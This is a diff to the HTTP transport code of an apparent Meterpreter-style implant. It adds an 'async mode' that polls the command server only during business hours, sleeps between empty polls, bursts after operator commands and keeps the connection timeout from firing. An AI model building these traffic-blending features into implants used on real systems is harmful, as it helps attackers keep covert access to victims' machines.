@@ -11,6 +11,11 @@
 #include "packet_encryption.h"
 #include "pivot_packet_dispatch.h"
 
+// Async mode helpers (defined in core_async.c)
+extern BOOL async_in_work_hours(HttpTransportContext* ctx);
+extern DWORD async_calculate_sleep_ms(HttpTransportContext* ctx);
+extern VOID async_touch_activity(HttpTransportContext* ctx);
+
 /*!
  * @brief Prepare a winHTTP request with the given context.
  * @param ctx Pointer to the HTTP transport context to prepare the request from.
@@ -314,6 +319,13 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 		}
 
 		dprintf("[PACKET TRANSMIT HTTP] request sent.. apparently");
+
+		// Async smart-sync: record that we just sent a response so the next
+		// idle poll uses the short burst delay instead of the full poll interval.
+		if (ctx->async_mode)
+		{
+			async_touch_activity(ctx);
+		}
 	} while(0);
 
 	ctx->close_req(hReq);
@@ -675,6 +687,24 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 			break;
 		}
 
+		// Async mode: wait until inside business hours before polling
+		if (ctx->async_mode && (ctx->async_work_start != ctx->async_work_end) && !async_in_work_hours(ctx))
+		{
+			dprintf("[DISPATCH] Outside business hours, sleeping 60s before re-check");
+			if (ctx->async_wake_event)
+			{
+				WaitForSingleObject(ctx->async_wake_event, 60000);
+			}
+			else
+			{
+				Sleep(60000);
+			}
+			// Keep comms timestamp fresh so the timeout check doesn't
+			// kill the transport during intentional out-of-hours sleep
+			transport->comms_last_packet = current_unix_timestamp();
+			continue;
+		}
+
 		dprintf("[DISPATCH] Reading data from the remote side...");
 		result = packet_receive_http(remote, &packet);
 
@@ -684,6 +714,24 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 			if (result == ERROR_EMPTY)
 			{
 				transport->comms_last_packet = current_unix_timestamp();
+
+				// In async mode, sleep for the configured poll interval on empty responses
+				if (ctx->async_mode && ctx->async_poll_interval > 0)
+				{
+					DWORD asyncDelay = async_calculate_sleep_ms(ctx);
+					dprintf("[DISPATCH] Async mode: no commands, sleeping for %ums", asyncDelay);
+					if (ctx->async_wake_event)
+					{
+						WaitForSingleObject(ctx->async_wake_event, asyncDelay);
+					}
+					else
+					{
+						Sleep(asyncDelay);
+					}
+					// Refresh timestamp so comms timeout doesn't fire after the async sleep
+					transport->comms_last_packet = current_unix_timestamp();
+					continue;
+				}
 			}
 			else if (result == ERROR_WINHTTP_CANNOT_CONNECT)
 			{
@@ -735,6 +783,14 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 
 			// Reset the empty count when we receive a packet
 			ecount = 0;
+
+			// Async smart-sync: an actual request from the framework means an
+			// operator interaction is in flight; the next idle poll should
+			// stay in the tight burst loop.
+			if (ctx->async_mode)
+			{
+				async_touch_activity(ctx);
+			}
 
 			dprintf("[DISPATCH] Returned result: %d", result);
 
@@ -802,6 +858,10 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 			{
 				dprintf("[DISPATCH] Packet was NULL, this indicates that it was a pivot packet");
 			}
+
+			// In async mode, do NOT sleep after handling a command — immediately
+			// poll again to drain any remaining queued commands. The sleep only
+			// happens on empty responses (no commands available).
 		}
 	}
 
